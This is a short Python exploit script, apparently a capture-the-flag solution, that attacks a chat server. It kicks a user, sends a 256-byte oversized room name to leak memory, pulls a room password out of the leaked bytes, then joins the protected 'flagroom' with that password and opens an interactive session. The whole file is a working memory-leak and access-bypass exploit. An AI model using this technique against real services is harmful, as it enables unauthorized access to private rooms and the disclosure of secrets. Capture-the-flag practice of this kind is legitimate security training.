#!/usr/bin/env python3

import argparse
import os
import sys
from libchat import *

context.log_level = 'debug'

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="Server host")
    parser.add_argument("port", type=int, help="Server port")
    args = parser.parse_args()

    r = remote(args.host, 1337)

    kick_user(r, b"Lobby", b"Admin")

    resp = recv_response(r)
    print(resp)
    p = connect(args.host, args.port, b"A" * 64)

    edit_room(p, b"flagroom", b"A"*256)

    leak = p.recv(1028)
    list_rooms(p)

    leak = p.recv(1028)
    
    password = leak[0x10d:]
    sl = password.find(b"\x00")
    password = password[:sl]
    print(password)

    join_room(p, b"A" * 256 + password, password)
    p.interactive()

if __name__ == "__main__":
    main()
